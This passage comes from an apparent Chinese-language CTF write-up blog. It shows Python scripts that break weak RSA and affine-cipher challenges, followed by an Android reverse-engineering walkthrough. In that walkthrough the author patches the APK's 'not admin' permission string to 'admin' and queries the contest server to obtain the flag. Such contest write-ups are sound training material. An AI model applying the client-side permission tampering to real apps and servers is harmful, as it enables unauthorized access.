<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"></span><br><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line"></span><br><span class="line">p = gcd(n, c)</span><br><span class="line">q = n / p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">M = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = M / <span class="number">2021</span> / <span class="number">1001</span> / p</span><br><span class="line"><span class="built_in">print</span> l2b(m)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/GoTDJ6Ztn2FmxgO.png"><img src="https://i.loli.net/2021/09/29/GoTDJ6Ztn2FmxgO.png"></a></p>
<blockquote>
<p><code>flag&#123;Math_1s_1nterest1ng_hah&#125;</code></p>
</blockquote>
<h4 id="warmup-加密算法"><a href="#warmup-加密算法" class="headerlink" title="[warmup]加密算法"></a>[warmup]加密算法</h4><p>这题的话，大致上就是搞类似于对称加密的自写加密协议，而且从映射<code>(a*addr+b) % m</code>来看可能是一一对应？所以先尝试搞个mapping出来，然后直接映射密文看看能不能搞出明文，结果一不小心直接出了…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">cipher_text, a, b, m</span>):</span></span><br><span class="line">	<span class="comment"># 搞个密文到明文的映射</span></span><br><span class="line">	mapping = &#123;&#125;</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">		mapping[(a * i + b) % m] = i</span><br><span class="line">	<span class="comment"># 先看看映射结果咋样</span></span><br><span class="line">	plain_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			plain_text += str1[mapping[addr]]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			plain_text += i</span><br><span class="line">	<span class="built_in">print</span>(plain_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decode(<span class="string">&#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span>, <span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/LvmRwCIU3z6kbXK.png"><img src="https://i.loli.net/2021/09/29/LvmRwCIU3z6kbXK.png"></a></p>
<blockquote>
<p><code>flag&#123;AffInE_CIpheR_iS_clAssiC&#125;</code></p>
</blockquote>
<h4 id="RSA2-PLUS"><a href="#RSA2-PLUS" class="headerlink" title="RSA2-PLUS"></a>RSA2-PLUS</h4><p>这题拿到题目，先一眼看出是把flag分成了俩无关的小套娃，所以当成两个rsa题单独解。</p>
<p>第一部分的话，是个原题，祥云杯和国外哪个比赛都出现过，直接套用原题脚本就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD, inverse, long_to_bytes <span class="keyword">as</span> l2b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">	factor_list = []</span><br><span class="line">	get_context().precision = <span class="number">2048</span></span><br><span class="line">	x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line">	<span class="comment"># print(x)</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		x += <span class="number">1</span></span><br><span class="line">		y2 = x ** <span class="number">2</span> - n</span><br><span class="line">		<span class="keyword">if</span> is_square(y2):</span><br><span class="line">			<span class="comment"># print(&#x27;x = &#x27;,x)</span></span><br><span class="line">			y2 = mpz(y2)</span><br><span class="line">			get_context().precision = <span class="number">2048</span></span><br><span class="line">			y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">			factor_list.append([x+y, x-y])</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c = <span class="number">6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line">factor_list = fermat_factorization(n)</span><br><span class="line">[X1, Y1] = factor_list[<span class="number">0</span>]</span><br><span class="line">[X2, Y2] = factor_list[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n</span><br><span class="line"></span><br><span class="line">p1 = GCD(X1, X2)</span><br><span class="line">p2 = X1 / p1</span><br><span class="line">q1 = GCD(Y1, Y2)</span><br><span class="line">q2 = Y1 / q1</span><br><span class="line"></span><br><span class="line">phi = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">flag1 = l2b(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span> flag1</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/NaTk2Ah4G5LPiZ6.png"><img src="https://i.loli.net/2021/09/29/NaTk2Ah4G5LPiZ6.png"></a></p>
<p>得到前半段<code>flag&#123;Euler_funct1ons</code>。</p>
<p>后半部分的话，给出了<code>p+q</code>和<code>p*q</code>，所以解方程呗。</p>
<p>但是用<code>sage</code>解的时候，不知道为啥解出了俩非整数。</p>
<p>所以就老老实实化简下方程用求根公式了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p2aq2 = <span class="number">274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line">p2mq2 = <span class="number">18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line">n = <span class="number">40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line">c = <span class="number">25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">get_context().precision=<span class="number">2048</span></span><br><span class="line">p2 = <span class="built_in">int</span>((p2aq2 + sqrt(p2aq2*p2aq2-p2mq2*<span class="number">4</span>))/<span class="number">2</span>)</span><br><span class="line">q2 = <span class="built_in">int</span>((p2aq2 - sqrt(p2aq2*p2aq2-p2mq2*<span class="number">4</span>))/<span class="number">2</span>)</span><br><span class="line"><span class="keyword">assert</span> is_prime(p2)</span><br><span class="line"><span class="keyword">assert</span> is_prime(q2)</span><br><span class="line"><span class="keyword">assert</span> p2+q2 == p2aq2</span><br><span class="line"><span class="keyword">assert</span> p2*q2 == p2mq2</span><br><span class="line"><span class="keyword">assert</span> p2*p2*q2*q2*q2 == n</span><br></pre></td></tr></table></figure>

<p>这里需要注意的是p和q的值是可能需要互换的，因为后面又涉及到<code>p*p*q*q*q</code>，所以两个情况只有一种成立，所以上面断言了一下<code>n</code>防止解错情况了。</p>
<p>然后根据多项rsa的phi公式解出phi，就能当正常rsa题做了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">phi = p2*p2*(p2-<span class="number">1</span>)*q2*q2*q2*(q2-<span class="number">1</span>)</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">flag2 = l2b(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line"><span class="built_in">print</span> flag2</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/giVbv7aGXcPYRqF.png"><img src="https://i.loli.net/2021/09/29/giVbv7aGXcPYRqF.png"></a></p>
<p>得到后半部分<code>_1s_very_interst1ng&#125;</code>。</p>
<p>所以flag就出来了。</p>
<blockquote>
<p><code>flag&#123;Euler_funct1ons_1s_very_interst1ng&#125;</code></p>
</blockquote>
<h3 id="创新技术"><a href="#创新技术" class="headerlink" title="创新技术"></a>创新技术</h3><h4 id="APP逆向-clockin"><a href="#APP逆向-clockin" class="headerlink" title="APP逆向-clockin"></a>APP逆向-clockin</h4><p>这题就是正常安卓逆向，感觉难度挺小的，那种搞app破解的脚本小子也能做。</p>
<p>先看看apk里有啥。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/xsNIVoaSjQpqdg4.png"><img src="https://i.loli.net/2021/09/29/xsNIVoaSjQpqdg4.png"></a></p>
<p>没有lib库，纯java实现，那难度应该不大，至少都是能暴力改包的。</p>
<p>其中的响应点击事件有个<code>PunchCardActivity</code>类，感觉是唯一跟题目相关的，跟过去看看。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/ujgQfAL8Nc5wOth.png"><img src="https://i.loli.net/2021/09/29/ujgQfAL8Nc5wOth.png"></a></p>
<p>开头有个<code>not admin</code>权限定义，值得注意，毕竟是远程题。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/jCgJuWZQUEhXIax.png"><img src="https://i.loli.net/2021/09/29/jCgJuWZQUEhXIax.png"></a></p>
<p>然后看函数调用链，还算比较浅的，没啥深入调用。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/KUQJhOHTeck8u5G.png"><img src="https://i.loli.net/2021/09/29/KUQJhOHTeck8u5G.png"></a></p>
<p>最后就<code>msg</code>是能存在远程交互的东西，也就是上面调用时的<code>PunchCardActivity.this.permission</code>，即刚才那个<code>not admin</code>。</p>
<p>而下面的返回结果判断逻辑也简单，空的话就报个权限不足提示，非空就显示。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/1oGmZUI8Yz5gBce.png"><img src="https://i.loli.net/2021/09/29/1oGmZUI8Yz5gBce.png"></a></p>
<p>所以猜测改成<code>admin</code>就能行。</p>
<p>于是去手机上安装，但是安装失败了。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/EI1ZxA2sv98LHtX.jpg"><img src="https://i.loli.net/2021/09/29/EI1ZxA2sv98LHtX.jpg"></a></p>
<p>报了个<code>[INSTALL_FAILED_TEST_ONLY: installPackageLI]</code>的错，查了下是调试状态倒的包，要改掉调试标识。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/HATXRaVs7voGqzn.jpg"><img src="https://i.loli.net/2021/09/29/HATXRaVs7voGqzn.jpg"></a></p>
<p>删掉<code>android:testOnly=&quot;true&quot;</code>之后，安装成功。</p>
<p>然后改下刚才猜测的<code>not admin</code>，改成<code>admin</code>。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/AsiT5DmKYJkMXGx.jpg"><img src="https://i.loli.net/2021/09/29/AsiT5DmKYJkMXGx.jpg"></a></p>
<p>去app里试试，输入<code>101.35.1.244:8080</code>后点一下刷卡图片直接拿到flag。</p>
<p><a target="_blank" rel="noopener" href="https://i.loli.net/2021/09/29/WQlNnB6Gzqys2V5.jpg"><img src="https://i.loli.net/2021/09/29/WQlNnB6Gzqys2V5.jpg"></a></p>
<blockquote>
<p><code>flag&#123;1cd8a8623acf512ea7a96c5305f1be9f&#125;</code></p>
</blockquote>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Riddler</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://riddlerm.github.io/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/">http://riddlerm.github.io/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://riddlerm.github.io" target="_blank">Riddler Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/01/03/hello-world/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Hello World</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="waline-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="http://thirdqq.qlogo.cn/g?b=oidb&amp;k=LMGBgwOams2fZdeTFTEk8g&amp;s=100" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Riddler</div><div class="author-info__description">Riddler Blog</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/RiddlerM"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NYNUSEC%E6%88%98%E9%98%9F"><span class="toc-number">1.</span> <span class="toc-text">NYNUSEC战队</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">1.1.</span> <span class="toc-text">一、战队信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="toc-number">1.2.</span> <span class="toc-text">二、解题情况</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">三、解题过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">1.2.2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%B8%89"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">题目三</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%9B%9B"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">题目四</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PWN"><span class="toc-number">1.2.3.</span> <span class="toc-text">PWN</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#null"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">null</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#uaf"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">uaf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#green"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">green</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE"><span class="toc-number">1.2.4.</span> <span class="toc-text">RE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E4%BA%8C"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">题目二</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Misc"><span class="toc-number">1.2.5.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">音频隐写</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">流量分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Crtpto"><span class="toc-number">1.2.6.</span> <span class="toc-text">Crtpto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA-1"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">RSA-1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#warmup-%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">1.2.6.2.</span> <span class="toc-text">[warmup]加密算法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RSA2-PLUS"><span class="toc-number">1.2.6.3.</span> <span class="toc-text">RSA2-PLUS</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9B%E6%96%B0%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.7.</span> <span class="toc-text">创新技术</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#APP%E9%80%86%E5%90%91-clockin"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">APP逆向-clockin</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/" title="绿城杯WP"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="绿城杯WP"/></a><div class="content"><a class="title" href="/2022/01/04/%E7%BB%BF%E5%9F%8E%E6%9D%AFWP/" title="绿城杯WP">绿城杯WP</a><time datetime="2022-01-03T17:56:23.000Z" title="发表于 2022-01-04 01:56:23">2022-01-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/03/hello-world/" title="Hello World"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2022/01/03/hello-world/" title="Hello World">Hello World</a><time datetime="2022-01-03T13:31:51.219Z" title="发表于 2022-01-03 21:31:51">2022-01-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Riddler</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>function loadWaline () {
  function initWaline () {
    const waline = new Waline(Object.assign({
      el: '#waline-wrap',
      serverURL: 'https://blog-api-m75hv7ilc-riddlerm.vercel.app/',
      avatar: 'wavatar',
      avatarCDN: 'https://sdn.geekzu.org/avatar/',
      path: location.pathname,
      visitor: false,
      dark: 'html[data-theme="dark"]'
    }, null))
  }

  if (typeof Waline === 'function') initWaline() 
  else getScript('https://cdn.jsdelivr.net/npm/@waline/client/dist/Waline.min.js').then(initWaline)
}

if ('Waline' === 'Waline' || !false) {
  if (false) btf.loadComment(document.getElementById('waline-wrap'),loadWaline)
  else setTimeout(loadWaline, 0)
} else {
  function loadOtherComment () {
    loadWaline()
  }
}</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>